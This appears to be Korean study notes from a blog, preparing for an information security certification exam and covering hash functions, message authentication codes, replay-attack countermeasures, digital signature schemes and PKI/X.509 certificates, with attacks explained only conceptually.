프리이미지 저항성 (preimage resistance) : 역상 저항성                                            해시함수 h 와 y=h(M) 에 대하여 Eve 가 이를 만족하는 M 값을 찾아내는게 힘들어야 함                       y = h(x) 를 만족하는 x 를 찾는 것이 불가능해야 함.                                                           제2프리이미지 저항성 (second preimage resistance) : 두 번째 역상 저항성, 약한 충돌 내성                                            메시지를 쉽게 위조할 수 없도록 하는 성질                       Eve가 메시지와 다이제스트를 가로채고 또 다른 다이제스트를 생성                       입력값 x에 대해서 h(x) = h(x’), x != x’ 을 만족하는 x’ 을 찾는 것이 불가능해야 함.                                                           충돌 저항성 (collision resistance) : 강한 충돌 내성                                            약한 충돌 내성보다 확률이 높음                       Eve 로 하여금 동일한 다이제스트를 가지는 2개의 메시지를 구하지 못하도록 하는 것                       h(x) = h(x’) 을 만족하는 입력값 x, x’ 을 찾는다는 것은 계산적으로 불가능해야 함.                                                                                                                       일방향 해시함수의 응용                    소프트웨어 변경 검출           무결성 검증           패스워드를 기초로 한 암호화                            패스워드와 솔트(의사난수 랜덤 값)를 섞은 결과의 해시값을 구해 그것을 암호화키로 사용 =&gt; 사전 공격 차단                                   메시지 인증코드                            송신자와 수신자만의 키와 메시지를 혼합하여 해시값을 계산 한 것               SSL/TLS 에서도 사용                                   전자서명           전자입찰 시스템                       랜덤 오라클 모델과 해시함수에 대한 공격                    랜덤 오라클 모델                            개요                                    해시함수에 대한 이상적인 수학적 모델                                               비둘기집 원리                                    n+1 비들기가 n개의 집에 들어가 있을 때 한 비둘기 집에는 두마리가 있다는 원리 (충돌을 의미)                                               생일 문제 (생일 공격)                                    같은 해시값을 생성하는 2개의 메시지를 구하는 것                   강한 충돌 내성을 깨고자 하는 공격                   생일 패러독스 (birthday paradox) -&gt; 일치할 확률이 상상 이상으로 높아지는 것                   랜덤으로 선택한 N명의 그룹, N 명 중 적어도 2명의 생일이 일치할 확률이 1/2 이상이 되도록 하기 위한 N은 최저 몇 명? -&gt; 23명                                            N명 전원 생일이 일치하지 않을 확률을 1에서 빼면 됨.                                                                                                                       일방향 해시함수에 대한 공격                    무차별 공격                            약한 충돌 내성을 깨고자 하는 공격               SHA-1 은 160 비트라서 2의 160승 회를 시행하면 됨                                   기타 해시함수 공격의 종류 및 특성                            일치블록 연쇄공격 : 새로운 메시지 M’ 을 사전에 다양하게 만들어 놓았다가 공격하고자 하는 메시지의 해시함수값 h(M) 과 같은 해시함수값을 갖는 것을 골라 사용하는 공격               중간자 연쇄공격 : 전체 해시 값이 아니라 해시 중간의 결과에 대한 충돌쌍을 찾는다.               고정점 연쇄공격 : 메시지 블록과 연쇄변수 쌍을 얻게 되면 임의의 수의 동등한 블록들 xi 를 메시지의 중간에 삽입해도 전체 해시값이 변하지 않는다.               차분 연쇄공격                                    다중 라운드 블록암호의 공격 = 다중 라운드 블록암호를 사용하는 해시 함수에서 입력값과 그에 대응하는 출력값 차이의 통계적 특성을 조사하는 기법                   해시함수의 공격 : 압축함수의 입출력 차이를 조사하여 0의 충돌쌍을 주로 찾아내는 방법을 사용                                                                               일방향 해시함수로 해결할 수 없는 문제                    조작과 변경을 검출할 수 있지만 거짓행세를 검출하지는 못함           무결성 외에 인증이라는 절차도 필요 (파일의 무결성 뿐만 아니라 파일의 송신처 검증도 필요)                            인증을 하기 위한 기술 : 메시지 인증코드와 전자서명과 같은 기술                                                   암호학적 해시함수의 예            개요                    압축함수의 두 가지 유형                            기본 개념                                    해시 함수를 설계하는 데에는 크게 서로 다른 2가지 경향이 있음.                   압축함수를 아무런 기초 없이 처음부터 새로 만드는 것, 목적에 맞추어 특별하게 설계.                   압축함수 자리에 대칭키 블록 암호를 사용하는 것.                                                                   새로 만드는 해시함수                            메시지 다이제스트 (Message Digest) (MD2 -&gt; MD4 -&gt; MD5)                                    MD 알고리즘에는 MD2, MD4, MD5 세 가지가 있음. RSA를 개발한 MIT의 Rivest 교수가 공개키 기반 구조를 만들기 위해 RSA 와 함께 개발                   1989년에 만들어진 MD2는 8비트 컴퓨터에 최적화, MD4(90년 개발), MD5(91년 개발) 은 32비트 컴퓨터에 최적화                   MD5 는 MD4의 확장판으로, MD4 보다 속도는 빠르지 않지만 데이터 보안성이 더 좋음.                   최종 버전인 MD5 : 메시지를 512비트로 된 블록들로 나누고, 128비트 다이제스트를 출력. 충돌 공격 내성을 갖기에는 길이가 짧음.                                               SHA (Secure Hash Algorithm)                                    안전 해시 알고리즘(SHA), 최근에 널리 사용                   NIST가 개발, 1993년에 FIPS PUB 180 으로 출판. SHA의 약점이 발견되었을 때 1995년 FIPS PUB 180-1로 나옴, 이를 SHA-1 이라고 함.                   SHA 는 MD4 해시함수에 기초, 설계도 MD4 를 모델로 함. MD5 보다 느리지만 안전함. SHA-1 해시값으로 160비트를 출력.                   2002년 NIST는 새 표준인 FIPS-180-2를 내놓음. 해시 값이 각각 256, 384와 512비트인 3개의 새로운 SHA 버전을 정의함. SHA-256, SHA-384, SHA-512. 이들 알고리즘을 SHA-2 라고 함.                   새로운 버전은 SHA-1과 하부구조가 동일. 동일한 유형의 모듈러 연산과 논리적 2진 연산을 이용. 2008년 FIP PUB 180-3 에는 224-비트 버전이 추가.                   2005년에 SHA-1의 강한 충돌 내성이 깨졌다는 것을 접수하고 SHA-3을 제정하기로 함. SHA-3 은 AES와 같은 방식으로 표준화                                                                               SHA-512                    개요                            기본개념                                    SHA-2에 포함 (SHA-224, SHA-256, SHA-384, SHA-512)                   SHA-512는 다중-블록 메시지로부터 512비트 다이제스트를 생성함. 각 블록은 1024비트 길이를 가짐.                                               길이 필드와 패딩                                    메시지 다이제스트를 생성하기 전에 메시지에 추가적으로 덧붙이는 128비트의 부호 없는 정수 길이 필드가 필요. (512의 경우)                                                                                                                                                            Original MSG Field (&lt;2^128)                               Padding Field (가변길이)                               Length Field (Original MSG 길이필드 - Hash 값 수정에 대한 방어체계)                                                                                                                                                                   메시지의 길이가 비트수로 표현된 값이 저장됨. 이 길이는 패딩을 하기 전의 원래 메시지 길이를 나타냄.                   부호 없는 128비트 정수 필드로 정의할 수 있는 수는 0부터 2^128-1 이다. 이 길이가 바로 SHA-512에서 감당할 수 있는 최대 메시지 길이.                                            2^128 비트 이하의 길이를 갖는 메시지를 1024비트의 블록으로 쪼갬.                       IV 512 bit 와 블록을 Compression 함수를 이용해 512 bit 생성                       위의 512bit 데이터를 다음 블록과 Compression 함수를 이용해 512 bit 생성…                                                                                                                       메시지 인증코드(MAC)                    MAC의 개요                            기본개념                                    메시지 인증을 위해 필요 (MAC, Message Authentication Code)                   해시함수 기반, 블록암호 = 전자서명보다 속도가 빠름                   무결성을 확인하고, 메시지에 대한 인증을 하는 기술 (변경과 거짓행세 검출 가능)                   임의 길이의 메시지와 송신자 및 수신자가 공유하는 키라는 2개의 입력값을 기초로 해서 고정 비트길이의 출력을 계산하는 함수, 이 출력을 MAC 값이라고 부름.                                            Msg 와 키(송신자,수신자 공유)를 MAC 함수에 입력하여 MAC 값(고정길이 비트)을 추출                                                                                       메시지 인증                                    암호를 사용하면 소극적 공격(도청)을, 인증을 사용하면 적극적 공격(데이터나 거래의 위조)를 방어할 수 있음.                                                                   변경 감지 코드 (MDC, Modification Detection Code)                            메시지의 무결성을 보장하는 메시지 다이제스트               Bob은 수신한 메시지로부터 새로운 MDC 를 생성하여 Alice 에게 받은 MDC 와 비교, 값이 동일하다면 해당 메시지는 변경되지 않음.               키가 없는 해시함수를 사용                                   메시지 인증 코드 (MAC)                            메시지의 무결성은 물론 Alice 가 메시지의 원 전송자이며 다른 사람이 Alice 인 척 하는 것이 아니라는 것을 말해주는 데이터 출원지 인증을 보장하기 위해, 변경 감지 코드를 메시지 인증코드(MAC) 로 바꿀 필요가 있음.               MDC와 MAC의 차이는 MAC 에는 Alice 와 Bob 사이의 비밀값이 포함. Eve 는 가지고 있지 않은 비밀키가 두 사람 사이의 비밀 값이 될 수 있다.                                    Eve 가 변조를 하더라도, 메시지와 키 값의 Hash 값인 MAC 값을 생성할 수 없음.                                                                   MAC 의 키 배송 문제                            MAC에서는 송신자와 수신자가 키를 공유할 필요가 있다.               대칭키 암호 때의 키 배송 문제와 같은 문제가 메시지 인증코드에서도 일어남.                                   MAC의 구현 사례                            축소 MAC                                    MAC의 안정성을 높이기 위해 축소 MAC(nested MAC) 이 설계됨. 두 단계의 해싱이 있음                   첫 번째 단계 : 키는 메시지와 이어 붙이고 해시하여 중간 단계의 다이제스트를 생성함.                   두 번째 단계 : 키는 중간단계 다이제스트에 이어 붙이고 최종적인 다이제스트를 생성                                               HMAC                                    축소 MAC 보다 더 복잡. 패딩 같은 추가적인 조치가 더 들어 있음.                   HMAC 은 일방향 해시함수를 이용하여 메시지 인증코드를 구성하는 방법.                   HMAC 의 H 는 Hash                                            블록길이                                                    SHA-1 : 512                           SHA-2 (SHA-224 : 512, SHA-256 : 512, SHA-384 : 1024, SHA-512 : 1024)                                                                       MD 길이                                                    SHA-1 : 160                           SHA-2 (SHA-224 : 224, SHA-256 : 256, SHA-384 : 384, SHA-512 : 512)                                                                       HMAC 과정                                                                                                                                                                                    키값 : 키                                   Key Padding (000..) 으로 블록길이만큼 늘임                                                                                                                                                   XOR 연산                           I Pad : 00110110 00110110 00110110 … 으로 블록길이만큼 늘임                           결과값 Si 와 메시지블록 M1, M2, … , Mn 을 결합하여 해시함수(H) 적용 (결과값 h)                           위 키값과 O Pad : 01011100 01011100 01011100 … 으로 블록길이만큼 늘린 값을 XOR 연산                                                                                                                                                           결과값 So 와 h 를 결합 (So                                   h) 하여 해시함수(H) 적용, 최종 MAC 값 추출                                                                                                                                                   H : SHA-1, MD5 등등…                                                                                                                                       CMAC (Cipher-based Message Authentication Code)                                    NIST 는 데이터 인증 알고리즘 혹은 CMAC 또는 CBCMAC 이라 부르는 표준 FIPS 113을 정의                   대칭키 암호시스템에 대한 암호 블록체인 (CBC) 모드와 유사한 방법                                            그러나 N개의 평문 블록으로부터 N개의 암호문 블록을 만드는 것은 아님. (1개의 암호문 블록 생성)                                                           CMAC 이 CBCMAC 보다 안전 (수학적 보완)                   과정                                            메시지 블록 M1, M2, …, Mn                       M1 과 k (키값) 을 E (Encrypt) 한 결과 R1                       M2 와 R1 을 Xor 연산 하여 k (키값) 을 E (Encrypt) …                       Mn 와 Rn-1 와 새로 생성한 k (키값) 을 E (Encrypt) =&gt; CMAC                                                                                                           MAC 의 이용 예                            IPSec (HMAC)                                    인터넷 기반 통신프로토콜 IP(Internet Protocol) 에 보안기능을 추가한 것                   통신 내용의 인증과 무결성을 확인하기 위해 MAC 을 이용                                               SSL/TLS (HMAC)                                    웹에서 온라인 쇼핑을 할 때 사용되는 통신 프로토콜                   통신 내용의 인증과 무결성 확인을 위해 메시지 인증코드를 이용                                               SET 프로토콜 (HMAC)                                   MAC 에 대한 공격                            재전송 공격                                    개요                                            적극적 공격자 멜로리는 자신이 보존해 둔 MAC 값을 반복해서 송신하는 공격을 감행.                       이를 재전송 공격(replay attack) 이라고 부름                                                    A 에서 B로 전송되는 Msg + MAC 을 Mellory 가 확보                           Msg + MAC 을 재전송                                                                       재전송 공격을 막을 수 있는 방법에는 아래 4가지가 있음.                                                           순서 번호 (sequence number)                                            송신 메시지에 매회 1회씩 증가하는 번호를 붙이기로 약속.                       MAC 값의 계산에 순서번호도 메시지에 포함시키도록 함.                       마지막 순서 번호를 기록해야 함.                                                           타임스탬프 (timestamp)                                            송신 메시지에 현재 시각을 넣기로 약속해두고 그 이전의 메시지가 왔을 경우에는 MAC 값이 바르더라도 오류라고 판단.                       시계 동기화 필요                                                           비표 (nonce)                                            메시지를 수신하기에 앞서 수신자는 송신자에게 일회용의 랜덤한 값 (비표) 를 줌.                       송신자는 비표를 포함해서 MAC 값을 계산, 비표의 값은 통신 때마다 바뀜.                       통신 데이터 양이 약간 증가                                                           시도/응답 (challenge/response)                                            비표와 유사 개념                       상대방에게 난수값을 보내면 상대방은 난수값을 포함한 응답값을 보내야 함.                                                                                                           MAC으로 해결할 수 없는 문제                            제 3자에 대한 증명                                    MAC 은 공유키를 사용하기에 MAC 값을 계산할 수 있는 것은 Alice 와 Bob 이다.                   두 사람이 서로 통신하고 있는 동안 그 MAC 값을 계산한 것은 상대방이라고 말할 수 있다.                   하지만 제3자 Victor 에게 이 MAC 값을 계산한 것은 자신이 아닌 상대방이라고 증명할 방법은 없다.                                            전자서명을 사용하면 제3자에 대한 증명이 가능해짐                                                                                       부인 방지                                    송신자 Alice 는 Bob 에게 그러한 메시지를 보내지 않았다고 Victor 에게 주장할 수 있고 이를 부인이라고 한다.                   MAC 에서는 Alice 와 Bob 중 어느 쪽 주장이 맞는지를 판단할 수 없다.                                            전자서명을 사용하면 부인방지가 가능함                                                                                                                       메시지 인증                    개요                            기본 개념                                    수신자가 받은 메시지가 송신자가 보낸 메시지와 동일한 것인지 확인하는 것                   메시지 내용 변경, 순서 변경, 삭제 및 훼손 등 불법 행위에 대하여 확인하는 기술                   관용 암호화 방식, 공개키 암호화 방식, 해시 함수, MAC 을 이용하는 방식 등                                               메시지 인증 방법                                    관용(대칭키) 암호방식을 이용한 메시지 인증 방식                                            평문을 사전에 분배해서 갖고 있던 비밀키로 암호화하여 암호문을 수신자에게 전송하면 수신자는 암호문을 비밀키로 복호화하여 확인                       이 때, 평문이 문장으로 되어 있으면 복호화 후 전송 중의 메시지 변경 여부를 확인할 수 있음                                                           공개키 암호화 방식을 이용한 메시지 인증 방식                                            송신자는 자신의 개인키로 평문을 암호화하여 암호문을 수신자에게 전송, 수신자는 송신자의 공개키로 암호문을 복호화하여 인증을 확인                       누구나 메시지 인증을 검증할 수 있음. 개인키를 알고 있는 송신자만 인증을 생성할 수 있기 때문에 제 3자가 송신자를 가장하여 메시지를 전송할 수 없음.                                                           해시 함수를 이용한 메시지 인증 방식                                            메시지로부터 해시 함수 결과 값을 계산한 후 수신한 해시 값과 비교하여 메시지의 무결성을 검증하는 방식                       해시 함수가 공개되어 있기 때문에 제 3자가 인증자인 것처럼 가장하여 임의의 메시지를 정당한 메시지인 것처럼 인증하면 수신자는 제 3자의 위조 인증임을 알 수 없음                       비밀정보를 해시 함수에 추가하여 계산하여 단점을 해결. 송수신자는 사전에 비밀정보를 가지고 있다가 인증하려는 메시지와 비밀정보를 연계하여 해시 함수에 인증하고 계산한 값을 메시지에 덧붙여 전송함.                       수신자는 사용자로부터 수신한 메시지와 자신이 보관하고 있는 비밀 정보로 해시함수를 계산한 후 수신한 해시 함수 결과 값과 비교하여 메시지 인증을 수행. 제3자는 비밀정보를 모름.                                                           MAC 을 이용한 메시지 인증 방식                                            MAC (Message Authentication Code) 은 관용 암호방식을 이용하여 간단한 무결성 검증 코드를 만들어 메시지에 부가시키는 방법                       MAC 을 이용해 메시지 인증 및 무결성 검사를 수행하는 절차로는 우선 송신자가 인증할 메시지를 비밀키로 암호화시킨 MAC 값을 계산한 후 메시지와 함께 수신자에게 전송.                                                                                                                          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","해시함수"],
        "url": "https://bluesplatter.com/is_certification/IS-Management-HashAlgorithm/",
        "teaser": null
      },{
        "title": "정보보안 - 전자서명",
        "excerpt":"전자서명     전자서명의 개요            암호화 방식에 따라 두 종류로 나뉨                    공개키 서명 방식 (공개키 암호화 방식)                            서명자의 검증 정보를 공개하여 누구나 검증할 수 있는 방식 (간편)                                   중재 서명 방식 (관용 암호방식)                            서명 생성과 검증을 제 3자가 중재 (불편)                                               전자서명 과정                    기본 개념                            송신자는 서명 알고리즘(signing algorithm)을 이용해서 메시지에 서명을 함               메시지와 서명은 수신자에게 전송됨               수신자는 메시지와 서명을 받고 이들에 검증 알고리즘(verifying algorithm)을 적용               참이면 메시지가 받아들여짐                                   디지털서명 (digital signature) - 전자서명의 한 종류, 공개키 암호화 방식을 사용                            Alice 가 Bob 에게 메시지를 보낼 때 Bob 은 송신자에 대한 확실성을 점검할 필요가 있음.               Bob 은 이 메시지가 Alice 에게서 온 것인지 Eve 에게서 온 것인지 확인하고 싶음.               Bob 은 Alice 에게 메시지에 전자서명을 해달라고 요청할 수 있고, Alice 는 이에 전자서명을 해줌.               디지털서명에서는 공개키 시스템이 필요. 서명자는 자신의 개인키로 서명, 검증자는 서명자의 공개키로 서명을 검증               암호화 시스템에서는 수신자의 개인키와 공개키가 활용됨. 디지털서명에서는 송신자의 개인키와 공개키가 사용됨.                                               전자서명 서비스                    메시지 인증                            안전한 디지털서명 구조는 메시지 인증 (데이터 근원 인증) 을 보장               Alice 에게서 받은 서명이 정말 Alice 의 서명인지를 보장                                   메시지 무결성                            전체 메시지에 서명을 할 경우에 보장, 메시지 변경 시 서명도 달라지기 때문               해시함수를 사용하여 검증 알고리즘을 만듦. 무결성 보장                                   부인방지 (신뢰받는 센터 활용)                            Alice 가 메시지를 보낸 사실을 부인하면 센터는 저장하고 있는 메시지를 제시할 수 있다.               Bob의 메시지가 센터가 보관하고 있는 메시지의 복사본과 같다면 Alice 는 법정에서 패하게 될 것이다.                                    Alice : 전송할 Msg 를 정해진 서명 알고리즘을 이용해 Alice 의 Private Key 를 이용해 서명한다.                   Alice : 서명된 메시지를 Trusted Center 에 보낸다.                   Trusted Center : Alice 의 Public Key 로 서명된 메시지를 검증 (검증알고리즘) 한다. (Msg)                   Trusted Center : Alice 가 보낸 서명된 알고리즘을 Bob에게 전달한다.                   Bob : Alice 의 Public Key로 검증 알고리즘을 이용해서 메시지를 얻어낸다. (Msg)                   Trusted Center 의 Msg 와 Bob 의 Msg 가 같다면 Alice 는 부인할 수 없게 된다.                                                                   기밀성                            디지털서명을 하더라도 기밀성이 보장되는 통신을 할 수는 없다. (전자서명이 기밀성을 보장하진 않음.)                                    전자서명은 메시지인증과 무결성을 보증함.                                               기밀성을 위해 메시지와 서명에 비밀키를 이용하거나 공개키를 이용해서 암호화를 해야만 한다.                                    Alice : 메시지를 Alice 의 Private Key를 이용, 서명알고리즘을 통해 서명함.                   Alice : 서명을 Bob의 Public Key를 이용, 암호화함.                   Bob : 암호화 메시지를 Bob 의 Private Key 를 이용, 복호화함.                   Bob : Alice 의 서명을 Alice 의 Pubilc Key 를 이용, 검증알고리즘을 통해 검증함. (Msg)                                                                               전자서명의 주요 기능                    위조 불가 (Unforgeable) : 합법적인 서명자만이 전자서명을 생성하는 것이 가능해야 한다.           서명자 인증 (User authentication) : 전자서명의 서명자를 불특정 다수가 검증할 수 있어야 한다.           부인방지 (Non-repudiation) : 서명자는 서명행위 이후에 서명한 사실을 부인할 수 없어야 한다. (신뢰할 수 있는 제3기관 이용)           변경 불가 (Unalterable) : 서명한 문서의 내용을 변경할 수 없어야 한다.           재사용 불가 (Not reusable) : 전자문서의 서명을 다른 전자문서의 서명으로 사용할 수 없어야 한다.                           전자서명의 구조            RSA 디지털 서명 구조                    RSA 아이디어를 이용하면 메시지에 서명을 하고 검증을 할 수 있다.                            암호화, 키교환에도 사용되는 공개키 기술               RSA 암호화 방식과 전자서명 방식이 동일               RSA : 소수를 이용, 소인수분해의 어려움을 기반으로 함.                                    p, q : 두 소수                   d : 개인키                   e : 공개키 (공개)                   n : p * q (공개)                                               Alice : Alice 의 Private key (d,n) 을 이용, M^d mod n 을 통해 서명 S 를 생성               Alice : 서명 S 를 전달               Alice : 메시지 M 을 전달               Bob : Alice 의 Public key (e,n) 을 이용, S^e mod n 을 통해 M’ 을 생성               Bob : M 과 M’ 을 비교, 같으면 M을 받아들임.                                               ElGamal 디지털서명 구조                    개요                            ElGamal 암호시스템과 동일한 키를 사용하지만 알고리즘은 다름.                                    ElGamal 과 동일하게 이산대수 문제 기반                                               서명 과정에서 두 개의 함수는 두 개의 서명을 생성               검증 과정에서 두 함수에서 출력되는 값을 비교하여 확인               한 개의 함수는 서명과 검증 과정에서 동시에 사용되지만 입력되는 것이 다를 뿐               키 생성 : ElGamal 디지털서명 구조에서 (e1, e2, p) 가 Alice 의 공개키이고 d는 개인키이다.               실제로 거의 사용되지 않음. DSA(Digital Signature Algorithm) 를 많이 사용 - ElGamal의 개량형                                               DSA  (Digital Signature Algorithm)                    개요                            DSS (Digital Signature Standard) : 미국의 전자서명 표준 = DSA 와 거의동일. ElGamal 전자서명을 개량한 것                                    ElGamal : 이산대수 문제 기반 알고리즘                   암호화에 사용되지 않음                   키교환에 사용되지 않음                   공개키 기술                                               DSA : NIST 에서 제안                                               ECDSA (Elliptic Curve DSA) = ECC 전자서명 (ECCDSA - 타원곡선 전자서명 구조)                    ECC (타원곡선) : RSA, ElGamal 보다 길이가 짧아 속도가 빠른 알고리즘           짧은 시간에 짧은 서명 생성 가능           ECDSA : 1998년 ANSI 에서 미국표준화                       KCDSA (Korea Certification-based DSA)                    1994년 국내에서 개발 (국가 표준 전자서명 알고리즘)           1997년 국가 표준으로 채택           1998년 TTA 에서 표준으로 채택           ElGamal 전자서명을 개선 (이산대수 문제의 어려움 기반) / DSS 를 변형           스마트카드에서도 편리하게 사용                       Schnorr 전자서명 구조                    ElGamal 전자서명에 기반, 서명의 크기는 작은 형태의 새로운 구조                            ElGamal은 매우 큰 소수를 사용해야 함 (1024bit 이상)                                   IC 카드에 적합                          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","전자서명"],
        "url": "https://bluesplatter.com/is_certification/IS-Management-DigitalSignature/",
        "teaser": null
      },{
        "title": "정보보안 - PKI / X.509",
        "excerpt":"PKI     PKI(공개키 기반 구조)            PKI(Public-Key Infrastructure) 의 개요                    기본 개념                            공개키 알고리즘을 위한 키 관리 구조               RFC 2822 는 공개키 기반구조(PKI) 를 비대칭키 암호시스템에 기초하여 디지털 인증서를 생성, 관리, 저장, 분배하고 취소하는 데 필요한 하드웨어, 소프트웨어, 사람, 정책 및 절차라고 정의함               PKI는 사용자 공개키와 사용자 ID 를 안전하게 전달하는 방법과 공개키를 신뢰성있게 관리하기 위한 수단을 제공. 암호화된 메일, 지불 프로토콜 등 다양한 인터넷 보안응용을 가능케 하기 위한 바탕을 제공함.               인증서의 발급, 사용 및 취소와 관련 서비스를 통하여 기밀성, 무결성, 접근제어, 인증, 부인방지의 보안 서비스 제공, 인증기관, 등록기관 디렉터리 서비스, 사용자 등의 요소로 구성됨.                                               PKI의 주요 구성요소                    구성요소                            인증기관                                    PAA, PCA, CA                                               검증기관 (VA - Validation Authority)                                    인증서 유효성 확인                   인증기관 (CA) 과 통합되는 경우가 대부분임                                               사용자                                    개체, 최종개체 라고도 함 (subjects, end entities)                   사람, 시스템 모두를 의미                   자신의 비밀키/공개키 쌍을 생성                   공개키 인증서 요청/획득 이 가능                   전자서명 생성/검증 가능                   인증서 폐지 요청 가능 : 비밀키를 분실, 훼손. 자신의 정보가 변경.                                               등록기관                                    RA                                               저장소                                    디렉토리                                            X.500                       LDAP                                                                                                           과정                            사용자 Bob 이 공개키를 인증기관을 통해 등록하려고 함.               인증기관은 저장소에 Bob의 공개키를 인증기관의 서명을 포함시켜서 (인증서) 보관함               사용자 Alice 가 Bob의 공개키가 필요할 경우 저장소에서 Bob 의 인증서 (Bob의 공개키 + 인증기관서명)를 다운로드 받음               사용자 Alice 는 Bob 의 공개키를 이용                                    사용자와 인증기관이 너무 먼 경우 인증기관 (CA) 대신 등록기관 (RA) 을 이용할 수도 있음                   RA는 대신 인증서를 생성하여 CA 에 전달                                                                   인증기관 (CA, Certification Authority)                            개요                                    인증정책을 수립, 인증서 및 인증서 효력정지 및 폐기목록 (CRL) 관리, 다른 CA와의 상호인증을 제공                   인증기관이 하는 일 가운데 “공개키의 등록과 본인에 대한 인증” 을 등록기관이나 사람(개체)에 분담시키는 경우도 있음.                   우리나라는 행정자치부 산하에 5개 민간 최상위 인증기관과 정부 최상위 인증기관을 두고 있음.                                            최상위 인증기관 : 전자서명인증관리센터(KISA)                       공인인증기관 : 한국정보인증, 코스콤, 금융결제원, 한국전자인증, 한국무역정보통신                                                                                                           인증기관의 주요 역할                            키쌍의 작성                                    이용자가 키쌍을 작성할 때는 PKI 의 이용자가 행하는 경우와 인증기관이 행하는 경우 두 가지가 있다.                                               인증서 등록                                    인증기관은 인증 업무준칙 (CPS, Certification Practice Statement) 에 근거해서 이용자를 인증하고 인증서를 작성                   인증서를 작성할 때에는 인증기관의 개인키를 사용해서 전자서명을 함                                               인증서 폐지                                    이용자가 개인키를 분실했거나 도난당했을 경우, 인증기관은 인증서를 폐지(revoke) 해서 무효로 할 필요가 있음.                                                                   등록기관 (RA, Registration Authority)                            개요                                    CA와 사용자가 원거리일 경우, 중간위치에서 사용자의 인증서 요구를 받고 인증서 발급 요청에 인증서를 전달하는 역할                   인증기관을 대신해 사용자의 신분을 확인, 발급된 인증서 및 해당 CA 상위기관의 공개키를 사용자에게 전달                                                                   디렉터리 서비스 (Directory Service)                            개요                                    PKI 관련 정보인 인증서와 사용자 관련 정보, 상호인증서 쌍, 인증서 효력정지 및 폐기목록 등을 저장 및 검색하는 장소로서, 응용분야에 따라 이를 위한 서버를 설치하거나 인증기관에서 관리                   현재 디렉터리 표준형식으로는 ITU-T 에서 정의한 X.500 표준형식과 이것을 간략화한 LDAP 이 있다.                                                                               PKI 의 주요 관리 대상                    인증서 (PKC, Public-Key Certificate)                            개요                                    한 쌍의 공개키/개인키와 특정 사람/기관을 연결시켜 주는, 즉 해당키가 특정인의 것이라는 것을 보증해주는 것                   전자서명에 사용된 개인키와 상응하는 공개키를 제공하여 그 공개키가 특정인의 것이라는 것을 확신할 수 있는 증거                   인증서는 믿을 수 있는 제3자(인증기관)가 발행. PKI의 근간을 이룸.                   공개키 인증서에는 이름이나 소속, 메일 주소 등의 개인정보 및 그 사람의 공개키가 기재.                   인증기관(CA) 의 개인키로 전자서명 되어 있음.                                               인증서 표준 규격 X.509                                    인증서는 인증기관에서 발행, 이용자가 검증 -&gt; 인증서의 형식이 서로 다르면 매우 불편, 따라서 표준을 정함                   ITU 나 ISO 에서 정하는 X.509가 가장 널리 사용                                            IP 보안, SSL, SET, S/MIME 등 네트워크 보안에서 널리 사용됨.                                                           구조                                            V1                                                    버전 (V1/V2/V3)                           인증서 일련번호 : CA에서 발행한 유일한 발행번호 - 발행자이름+일련번호                           서명알고리즘 식별자 : DSA(DSS), RSA - 알고리즘과 매개변수가 들어감 (활용도 낮음-서명부때문)                           발행자 이름 (Issuer Name) : 인증기관명 (국가명, 조직명, 부서명, 개인이름 등)                           유효기간 : 시작일자 00.00.00 이후 (not before) / 종료일자 00.00.00 이전 (not after)                           주체이름 : 인증서의 사용자(=피발급자, Subject) 이름                                                            상위인증기관에 하위인증기관이 인증서 발급을 요청하는 경우 주체이름은 하위인증기관(CA) 이 될 수 있음.                                                                                   주체 공개키정보 : 인증서의 핵심부분. 사용자(주체)의 공개키, 관련 알고리즘정보, 매개변수 등                                                                       V2(추가-선택사항)                                                    발행자 유일식별자 : 발급자의 이름이 중복되는 경우 이를 구분하기 위함                           주체 유일식별자                                                                       V3(추가-선택사항)                                                    확장영역                                                            키와 정책정보 / 인증서주체와 발행자속성 / 인증경로 제약조건 중 1                                                                                                                               공통                                                    서명 : CA의 개인키로 암호화. 다른 필드 전체 (필수영역과 선택영역) 의 해시코드를 포함함.                                                            필수영역과 선택영역을 해시 알고리즘을 통한 Digest 값을, CA의 개인키를 이용한 서명알고리즘을 통해 서명 Digest 값을 구함.                               해시 알고리즘 ID 와 암호(Cipher) ID, 파라미터값을 포함                                                                                                                                                                                               인증서 확장                                    X.509 버전 3에서는 버전 2형식에 추가될 수 있는 선택사항으로 많은 확장을 포함                   확장은 세 가지 부류 중의 하나로 속함 (세가지 중 하나를 포함할 수 있다.)                                            키와 정책 정보                                                    기관키 식별자 (Authority Key Identifier) : 인증서를 서명하기 위해 사용되는 개인키에 대응하는 공개키를 구분할 수 있는 수단                           사용자키 식별자 (Subject Key Identifier) : 최종개체(사용자) 가 여러 인증서를 획득한 경우, 특정 공개키를 포함하는 인증서의 집합을 빠르게 구분하기 위함                           키의 용도 (Key usage) : 암호화 / 전자서명 / 인증서서명 중 어떤 것에 사용된 것인지?                           인증서 정책 : 인증기관의 경우 자신이 발행한 인증서에 정책을 명기할 수 있음                                                                       인증서 주체와 발행자 속성                                                    인증서 주체가 어떤 특정인, 특정개체라는 것을 인증서 사용자가 확신하도록 인증서 주체에 대한 추가적 정보를 이 필드에 나타냄 (사용자대체이름, 우편주소, DNS, IP주소, URI, 발급자대체이름, 기관 내의 직위 혹은 사진)                                                                       인증 경로 제약 조건                                                    다른 CA에 의해 CA에게 발행된 인증서 안에 제약조건을 포함할 수 있게 함                                                            기본 제한 (basic constraints)                               이름 제한 (name constraints) : 사용자 이름(DN-Distinguished Name)/대체이름에 대한 제한                               정책 제한 (policy constraints)                                                                                   제약조건은 주체 CA에 의해 발행될 수 있는 인증서의 유형에 제약을 가할 수 있음                           인증 체인에서 연속적으로 발생하는 인증서의 유형에 제약을 가할 수도 있음                                                                                                                                       인증서 갱신                                    모든 인증서에는 유효기간이 존재                   문제가 없다면 사용 중인 인증서의 기간이 끝나기 전에 새로운 인증서를 발급                                               인증서 폐지                                    유효기간이 끝나면 폐지해야 함                   사용자(주체)의 개인키가 침해 당했을 경우.                   CA 가 사용자들을 더 이상 인증하지 않을 때                   인증서를 검증하는데 필요한 CA의 개인키가 침해를 받았을 경우                                                                   CRL (Certificate Revocation List) - 인증서 취소/폐지/폐기 목록                            CRL은 인증기관이 폐지한 인증서 목록임.               폐지된 인증서의 일련번호목록에 인증기관이 전자서명을 붙인 것                                    인증서의 일련번호 : 인증기관이 발행한 인증서에 붙여진 순서번호로 인증서 속에 반드시 기재됨                                               PK 이용자는 인증기관으로부터 최신의 CRL을 입수해서 자신이 검증하려는 공개키의 인증서가 폐지되어 있지 않은지 조사할 필요가 있음                                    CRL 주소에 접속하여 CRL을 다운로드                   CRL 의 